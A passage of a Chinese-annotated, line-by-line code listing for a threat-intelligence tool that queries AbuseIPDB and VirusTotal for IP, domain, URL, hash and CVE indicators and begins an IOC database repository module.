| 20 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_DOMAIN_RE = re.compile(` |
| 21 | 函数调用：执行已有函数/方法完成当前步骤。 | `    r"^(?=.{1,253}$)(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$"` |
| 22 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 23 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_CVE_RE = re.compile(r"^CVE-\d{4}-\d{4,}$", re.IGNORECASE)` |
| 24 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_HASH_RE = re.compile(r"^[a-f0-9]{32,128}$", re.IGNORECASE)` |
| 25 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 26 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 27 | 函数定义：声明 `not_configured` 的输入、处理逻辑和返回结果。 | `def not_configured(provider: str) -> Dict[str, Any]:` |
| 28 | 返回结果：把处理后的值交回调用方。 | `    return {` |
| 29 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "ok": False,` |
| 30 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "provider": provider,` |
| 31 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "reason": "not_configured",` |
| 32 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "is_malicious": False,` |
| 33 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 34 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 35 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 36 | 类定义：声明 `IOCProvider`，封装相关状态与行为。 | `class IOCProvider(ABC):` |
| 37 | 文档字符串：说明当前模块、类或函数的职责。 | `    """统一查询接口：按 ioc_type + value 返回结构化结果（不得包含密钥）。"""` |
| 38 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    name: str` |
| 40 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 41 | 装饰器：为下面的函数或类附加框架行为。 | `    @abstractmethod` |
| 42 | 函数定义：声明 `query` 的输入、处理逻辑和返回结果。 | `    def query(self, ioc_type: str, value: str, *, timeout: float) -> Dict[str, Any]:` |
| 43 | 抛出异常：主动报告不可继续的错误。 | `        raise NotImplementedError` |
| 44 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 45 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 46 | 类定义：声明 `PlaceholderIOCProvider`，封装相关状态与行为。 | `class PlaceholderIOCProvider(IOCProvider):` |
| 47 | 文档字符串：说明当前模块、类或函数的职责。 | `    """预留第三方：仅配置占位与降级。"""` |
| 48 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 49 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(self, name: str) -> None:` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.name = name` |
| 51 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 52 | 函数定义：声明 `query` 的输入、处理逻辑和返回结果。 | `    def query(self, ioc_type: str, value: str, *, timeout: float) -> Dict[str, Any]:` |
| 53 | 返回结果：把处理后的值交回调用方。 | `        return not_configured(self.name)` |
| 54 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 55 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 56 | 类定义：声明 `AbuseIPDBProvider`，封装相关状态与行为。 | `class AbuseIPDBProvider(IOCProvider):` |
| 57 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    name = "abuseipdb"` |
| 58 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 59 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(self, api_key: str) -> None:` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._api_key = api_key or ""` |
| 61 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 62 | 函数定义：声明 `query` 的输入、处理逻辑和返回结果。 | `    def query(self, ioc_type: str, value: str, *, timeout: float) -> Dict[str, Any]:` |
| 63 | 条件判断：满足条件时进入对应分支。 | `        if ioc_type != "ip":` |
| 64 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 65 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "ok": False,` |
| 66 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "provider": self.name,` |
| 67 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": "unsupported_type",` |
| 68 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "is_malicious": False,` |
| 69 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 70 | 条件判断：满足条件时进入对应分支。 | `        if not self._api_key:` |
| 71 | 返回结果：把处理后的值交回调用方。 | `            return {**not_configured(self.name), "reason": "api_key_missing"}` |
| 72 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ip = value.strip()` |
| 73 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            resp = requests.get(` |
| 75 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "https://api.abuseipdb.com/api/v2/check",` |
| 76 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                headers={"Key": self._api_key, "Accept": "application/json"},` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                params={"ipAddress": ip, "maxAgeInDays": 30, "verbose": ""},` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                timeout=timeout,` |
| 79 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 80 | 函数调用：执行已有函数/方法完成当前步骤。 | `            resp.raise_for_status()` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            data = (resp.json() or {}).get("data", {})` |
| 82 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except requests.exceptions.Timeout:` |
| 83 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[IOC] AbuseIPDB 查询超时")` |
| 84 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 85 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "ok": False,` |
| 86 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "provider": self.name,` |
| 87 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": "timeout",` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "is_malicious": False,` |
| 89 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 90 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except requests.exceptions.RequestException as exc:` |
| 91 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[IOC] AbuseIPDB 查询失败: %s", exc)` |
| 92 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "ok": False,` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "provider": self.name,` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": "request_error",` |
| 96 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "is_malicious": False,` |
| 97 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 98 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except ValueError as exc:` |
| 99 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[IOC] AbuseIPDB 响应解析失败: %s", exc)` |
| 100 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "ok": False,` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "provider": self.name,` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": "parse_error",` |
| 104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "is_malicious": False,` |
| 105 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 106 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 107 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        score = int(data.get("abuseConfidenceScore", 0) or 0)` |
| 108 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        malicious = score >= 50` |
| 109 | 返回结果：把处理后的值交回调用方。 | `        return {` |
| 110 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "ok": True,` |
| 111 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "provider": self.name,` |
| 112 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "is_malicious": malicious,` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "score": score,` |
| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "country_code": data.get("countryCode"),` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "usage_type": data.get("usageType"),` |
| 116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "isp": data.get("isp"),` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "domain": data.get("domain"),` |
| 118 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "total_reports": data.get("totalReports"),` |
| 119 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "last_reported_at": data.get("lastReportedAt"),` |
| 120 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 121 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 122 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 123 | 类定义：声明 `VirusTotalProvider`，封装相关状态与行为。 | `class VirusTotalProvider(IOCProvider):` |
| 124 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    name = "virustotal"` |
| 125 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 126 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(self, api_key: str) -> None:` |
| 127 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._api_key = api_key or ""` |
| 128 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 129 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 130 | 函数定义：声明 `_url_to_vt_id` 的输入、处理逻辑和返回结果。 | `    def _url_to_vt_id(url: str) -> str:` |
| 131 | 文档字符串：说明当前模块、类或函数的职责。 | `        """VirusTotal v3 \`\`/urls/{id}\`\` 使用 URL 的 urlsafe base64（无 padding）。"""` |
| 132 | 返回结果：把处理后的值交回调用方。 | `        return base64.urlsafe_b64encode(url.strip().encode("utf-8")).decode("ascii").rstrip("=")` |
| 133 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 134 | 装饰器：为下面的函数或类附加框架行为。 | `    @classmethod` |
| 135 | 函数定义：声明 `_vt_url` 的输入、处理逻辑和返回结果。 | `    def _vt_url(cls, ioc_type: str, value: str) -> Optional[str]:` |
| 136 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        v = value.strip()` |
| 137 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        t = ioc_type.lower()` |
| 138 | 条件判断：满足条件时进入对应分支。 | `        if t == "ip":` |
| 139 | 返回结果：把处理后的值交回调用方。 | `            return f"https://www.virustotal.com/api/v3/ip_addresses/{v}"` |
| 140 | 条件判断：满足条件时进入对应分支。 | `        if t == "domain":` |
| 141 | 返回结果：把处理后的值交回调用方。 | `            return f"https://www.virustotal.com/api/v3/domains/{v.lower()}"` |
| 142 | 条件判断：满足条件时进入对应分支。 | `        if t == "url":` |
| 143 | 返回结果：把处理后的值交回调用方。 | `            return f"https://www.virustotal.com/api/v3/urls/{cls._url_to_vt_id(v)}"` |
| 144 | 条件判断：满足条件时进入对应分支。 | `        if t == "file_hash":` |
| 145 | 返回结果：把处理后的值交回调用方。 | `            return f"https://www.virustotal.com/api/v3/files/{v.lower()}"` |
| 146 | 条件判断：满足条件时进入对应分支。 | `        if t == "cve":` |
| 147 | 返回结果：把处理后的值交回调用方。 | `            return f"https://www.virustotal.com/api/v3/cve/{v.upper()}"` |
| 148 | 返回结果：把处理后的值交回调用方。 | `        return None` |
| 149 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 150 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 151 | 函数定义：声明 `_validate` 的输入、处理逻辑和返回结果。 | `    def _validate(ioc_type: str, value: str) -> Tuple[bool, str]:` |
| 152 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        t = ioc_type.lower()` |
| 153 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        v = value.strip()` |
| 154 | 条件判断：满足条件时进入对应分支。 | `        if t == "ip":` |
| 155 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            parts = v.split(".")` |
| 156 | 条件判断：满足条件时进入对应分支。 | `            if len(parts) != 4:` |
| 157 | 返回结果：把处理后的值交回调用方。 | `                return False, "invalid_ip_format"` |
| 158 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 159 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                ok = all(0 <= int(p) <= 255 and p == str(int(p)) for p in parts)` |
| 160 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except ValueError:` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                ok = False` |
| 162 | 返回结果：把处理后的值交回调用方。 | `            return ok, "invalid_ip_format"` |
| 163 | 条件判断：满足条件时进入对应分支。 | `        if t == "domain":` |
| 164 | 返回结果：把处理后的值交回调用方。 | `            return bool(_DOMAIN_RE.match(v)), "invalid_domain_format"` |
| 165 | 条件判断：满足条件时进入对应分支。 | `        if t == "url":` |
| 166 | 返回结果：把处理后的值交回调用方。 | `            return v.startswith(("http://", "https://")), "invalid_url_format"` |
| 167 | 条件判断：满足条件时进入对应分支。 | `        if t == "file_hash":` |
| 168 | 返回结果：把处理后的值交回调用方。 | `            return bool(_HASH_RE.match(v)), "invalid_hash_format"` |
| 169 | 条件判断：满足条件时进入对应分支。 | `        if t == "cve":` |
| 170 | 返回结果：把处理后的值交回调用方。 | `            return bool(_CVE_RE.match(v)), "invalid_cve_format"` |
| 171 | 返回结果：把处理后的值交回调用方。 | `        return False, "unsupported_type"` |
| 172 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 173 | 函数定义：声明 `query` 的输入、处理逻辑和返回结果。 | `    def query(self, ioc_type: str, value: str, *, timeout: float) -> Dict[str, Any]:` |
| 174 | 条件判断：满足条件时进入对应分支。 | `        if not self._api_key:` |
| 175 | 返回结果：把处理后的值交回调用方。 | `            return {**not_configured(self.name), "reason": "api_key_missing"}` |
| 176 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ok, reason = self._validate(ioc_type, value)` |
| 177 | 条件判断：满足条件时进入对应分支。 | `        if not ok:` |
| 178 | 返回结果：把处理后的值交回调用方。 | `            return {"ok": False, "provider": self.name, "reason": reason, "is_malicious": False}` |
| 179 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        url = self._vt_url(ioc_type, value)` |
| 180 | 条件判断：满足条件时进入对应分支。 | `        if not url:` |
| 181 | 返回结果：把处理后的值交回调用方。 | `            return {"ok": False, "provider": self.name, "reason": "unsupported_type", "is_malicious": False}` |
| 182 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 183 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            resp = requests.get(` |
| 184 | 代码语句：参与当前文件的业务流程或数据处理。 | `                url,` |
| 185 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                headers={"x-apikey": self._api_key, "Accept": "application/json"},` |
| 186 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                timeout=timeout,` |
| 187 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 188 | 函数调用：执行已有函数/方法完成当前步骤。 | `            resp.raise_for_status()` |
| 189 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            attrs = (resp.json() or {}).get("data", {}).get("attributes", {}) or {}` |
| 190 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except requests.exceptions.Timeout:` |
| 191 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[IOC] VirusTotal 查询超时")` |
| 192 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 193 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "ok": False,` |
| 194 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "provider": self.name,` |
| 195 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": "timeout",` |
| 196 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "is_malicious": False,` |
| 197 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 198 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except requests.exceptions.RequestException as exc:` |
| 199 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[IOC] VirusTotal 查询失败: %s", exc)` |
| 200 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 201 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "ok": False,` |
| 202 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "provider": self.name,` |
| 203 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": "request_error",` |
| 204 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "is_malicious": False,` |
| 205 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 206 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except ValueError as exc:` |
| 207 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[IOC] VirusTotal 响应解析失败: %s", exc)` |
| 208 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 209 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "ok": False,` |
| 210 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "provider": self.name,` |
| 211 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": "parse_error",` |
| 212 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "is_malicious": False,` |
| 213 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 214 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 215 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        stats = attrs.get("last_analysis_stats", {}) or {}` |
| 216 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        malicious = int(stats.get("malicious", 0) or 0)` |
| 217 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        reputation = int(attrs.get("reputation", 0) or 0)` |
| 218 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        is_malicious = malicious >= 3` |
| 219 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        out: Dict[str, Any] = {` |
| 220 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "ok": True,` |
| 221 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "provider": self.name,` |
| 222 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "is_malicious": is_malicious,` |
| 223 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "malicious": malicious,` |
| 224 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "suspicious": int(stats.get("suspicious", 0) or 0),` |
| 225 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "harmless": int(stats.get("harmless", 0) or 0),` |
| 226 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "undetected": int(stats.get("undetected", 0) or 0),` |
| 227 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "reputation": reputation,` |
| 228 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 229 | 条件判断：满足条件时进入对应分支。 | `        if ioc_type == "ip":` |
| 230 | 函数调用：执行已有函数/方法完成当前步骤。 | `            out.update(` |
| 231 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 232 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "score": min(100, malicious * 10) if malicious else malicious,` |
| 233 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "country": attrs.get("country"),` |
| 234 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "as_owner": attrs.get("as_owner"),` |
| 235 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "network": attrs.get("network"),` |
| 236 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 237 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 238 | 条件分支：前面条件不满足时继续判断。 | `        elif ioc_type == "domain":` |
| 239 | 函数调用：执行已有函数/方法完成当前步骤。 | `            out.update(` |
| 240 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 241 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "score": min(100, malicious * 10) if malicious else malicious,` |
| 242 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "categories": attrs.get("categories") or {},` |
| 243 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "registrar": attrs.get("registrar"),` |
| 244 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 245 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 246 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 247 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            out["score"] = min(100, malicious * 10) if malicious else malicious` |
| 248 | 返回结果：把处理后的值交回调用方。 | `        return out` |
| 249 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 250 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 251 | 函数定义：声明 `build_default_provider_registry` 的输入、处理逻辑和返回结果。 | `def build_default_provider_registry(` |
| 252 | 代码语句：参与当前文件的业务流程或数据处理。 | `    *,` |
| 253 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    abuseipdb_key: str,` |
| 254 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    virustotal_key: str,` |
| 255 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> Dict[str, IOCProvider]:` |
| 256 | 文档字符串：说明当前模块、类或函数的职责。 | `    """name -> provider，含占位实现。"""` |
| 257 | 返回结果：把处理后的值交回调用方。 | `    return {` |
| 258 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "abuseipdb": AbuseIPDBProvider(abuseipdb_key),` |
| 259 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "virustotal": VirusTotalProvider(virustotal_key),` |
| 260 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "spamhaus": PlaceholderIOCProvider("spamhaus"),` |
| 261 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "phishtank": PlaceholderIOCProvider("phishtank"),` |
| 262 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "openphish": PlaceholderIOCProvider("openphish"),` |
| 263 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "nvd": PlaceholderIOCProvider("nvd"),` |
| 264 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "cnvd": PlaceholderIOCProvider("cnvd"),` |
| 265 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |

## `src/collectors/ioc_repository.py`

- 类型：后端采集
- 行数：199

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `IOC 持久化与多源合并（数据库层）。` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `与 \`\`web.models.IOC\`\` 对齐；不记录 API Key；会话由调用方管理（commit/rollback）。` |
| 5 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 6 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 7 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 8 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import re` |
| 9 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import uuid` |
| 10 | 导入对象：从指定模块引入类、函数或常量。 | `from datetime import datetime, timedelta, timezone` |
| 11 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Dict, List, Optional, Sequence, Set` |
| 12 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 13 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_CVE_CANON = re.compile(r"^(CVE-\d{4}-\d{4,})$", re.IGNORECASE)` |
| 14 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 15 | 导入对象：从指定模块引入类、函数或常量。 | `from sqlalchemy.orm import Session` |
| 16 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 17 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 18 | 函数定义：声明 `utc_now` 的输入、处理逻辑和返回结果。 | `def utc_now() -> datetime:` |
| 19 | 返回结果：把处理后的值交回调用方。 | `    return datetime.now(timezone.utc)` |
| 20 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 函数定义：声明 `_canonical_value` 的输入、处理逻辑和返回结果。 | `def _canonical_value(ioc_type: str, value: str) -> str:` |
| 23 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    t = ioc_type.lower().strip()` |
| 24 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    v = value.strip()` |
| 25 | 条件判断：满足条件时进入对应分支。 | `    if t == "domain":` |
| 26 | 返回结果：把处理后的值交回调用方。 | `        return v.lower()` |
| 27 | 条件判断：满足条件时进入对应分支。 | `    if t == "file_hash":` |
| 28 | 返回结果：把处理后的值交回调用方。 | `        return v.lower()` |
| 29 | 条件判断：满足条件时进入对应分支。 | `    if t == "cve":` |
| 30 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        m = _CVE_CANON.match(v)` |
| 31 | 返回结果：把处理后的值交回调用方。 | `        return m.group(1).upper() if m else v.upper()` |
| 32 | 返回结果：把处理后的值交回调用方。 | `    return v` |
| 33 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 34 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 35 | 函数定义：声明 `merge_source_lists` 的输入、处理逻辑和返回结果。 | `def merge_source_lists(a: Optional[Sequence[str]], b: Optional[Sequence[str]]) -> List[str]:` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    out: List[str] = []` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    seen: Set[str] = set()` |
| 38 | 循环：逐个处理集合或迭代器中的元素。 | `    for src in list(a or ()) + list(b or ()):` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        s = (src or "").strip()` |
| 40 | 条件判断：满足条件时进入对应分支。 | `        if not s or s in seen:` |
| 41 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 42 | 函数调用：执行已有函数/方法完成当前步骤。 | `        seen.add(s)` |
| 43 | 函数调用：执行已有函数/方法完成当前步骤。 | `        out.append(s)` |
| 44 | 返回结果：把处理后的值交回调用方。 | `    return out` |
| 45 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 46 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 47 | 类定义：声明 `IOCRepository`，封装相关状态与行为。 | `class IOCRepository:` |
| 48 | 文档字符串：说明当前模块、类或函数的职责。 | `    """Flask-SQLAlchemy \`\`Session\`\` 上的 IOC CRUD / 合并。"""` |
| 49 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 50 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(self, session: Session) -> None:` |
| 51 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.session = session` |
| 52 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 53 | 函数定义：声明 `_model` 的输入、处理逻辑和返回结果。 | `    def _model(self):  # lazy import：避免无 Flask 时加载失败` |
| 54 | 导入对象：从指定模块引入类、函数或常量。 | `        from web.models import IOC` |
| 55 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
